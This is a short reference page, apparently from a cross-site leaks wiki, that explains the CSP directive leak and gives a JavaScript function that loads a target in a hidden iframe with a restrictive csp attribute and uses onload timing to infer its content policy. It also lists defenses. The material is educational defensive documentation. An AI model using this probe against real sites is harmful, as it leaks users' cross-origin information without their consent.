+++
title = "CSP leaks"
description = ""
category = "Attack"
abuse = [
    "CSP Violations",
]
defenses = [
    "SameSite Cookies"
]
menu = "main"
weight = 2
+++

## CSP Directive Leak

Without using the `Allow-CSP-From` header an embeder is not allowed to set a more restictive policy on to an iframe,
For most directives so by trying to applying `img-src 'https://example.com';` to the iframe csp attribute it will refuse to load unless its only allowing images from that source this can be detected with the onload event.  [^directive-demo]

```javascript
async function ifResticts(url, csp) {
    return new Promise((r) => {
        let f = document.createElement('iframe');
        f.setAttribute('csp', csp);
        f.hidden = true;
        f.src = url;
        f.onload = () => {
            f.onload = () => {
                f.remove();
                return r(0);
            }
            f.src = url + '#';
        }
        let t = setTimeout(() => {
            f.remove();
            return r(1);
        }, 2000);
        document.body.append(f);
    });
}
```
{{< hint info >}}
Firefox doesn't currently support the iframe csp property.
{{< /hint >}}

## Defense

| [SameSite Cookies (Lax)]({{< ref "/docs/defenses/opt-in/same-site-cookies.md" >}}) | [COOP]({{< ref "/docs/defenses/opt-in/coop.md" >}}) | [Framing Protections]({{< ref "/docs/defenses/opt-in/xfo.md" >}}) |                                          [Isolation Policies]({{< ref "/docs/defenses/isolation-policies" >}})                                           |
| :--------------------------------------------------------------------------------: | :-------------------------------------------------: | :---------------------------------------------------------------: | :------------------------------------------------------------------------------------------------------------------------------------------------------: |
|                                         ✔️                                         |                         ❌                          |                                ✔️                                 | [RIP]({{< ref "/docs/defenses/isolation-policies/resource-isolation" >}}) 🔗 [NIP]({{< ref "/docs/defenses/isolation-policies/navigation-isolation" >}}) |
## References

[^directive-demo]: CSP Directive Leak, [link](https://xsinator.com/testing.html#CSP%20Directive%20Leak)
